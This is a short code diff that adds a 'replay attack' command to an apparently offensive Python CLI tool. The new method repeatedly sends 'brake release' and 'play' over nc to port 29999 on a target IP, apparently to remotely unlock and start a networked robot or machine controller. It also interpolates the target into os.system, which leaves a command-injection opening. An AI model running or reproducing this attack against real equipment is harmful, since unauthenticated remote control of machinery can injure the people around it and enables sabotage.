@@ -5,6 +5,7 @@ import cmd
 import subprocess
 import json
 import re
+import time
 
 
 class Parser():
@@ -58,6 +59,15 @@ class CLI(cmd.Cmd):
     def do_user(self, line):
         """sets the user for target"""
         self.target_user = line.strip()
+    def do_replay(self, line):
+        """runs a replay attack if target in remote"""
+        cycles =int(input("How long do you want to try and run replay attack (in minutes): "))*2
+        for i in range(cycles):
+            os.system(f"echo brake release | nc {self.target_ip} 29999")
+            time.sleep(30)
+            os.system(f"echo play | nc {self.target_ip} 29999")
+
+
 
     def do_vul_analysis(self, line):
         """runs a simple vulnerability analysis"""
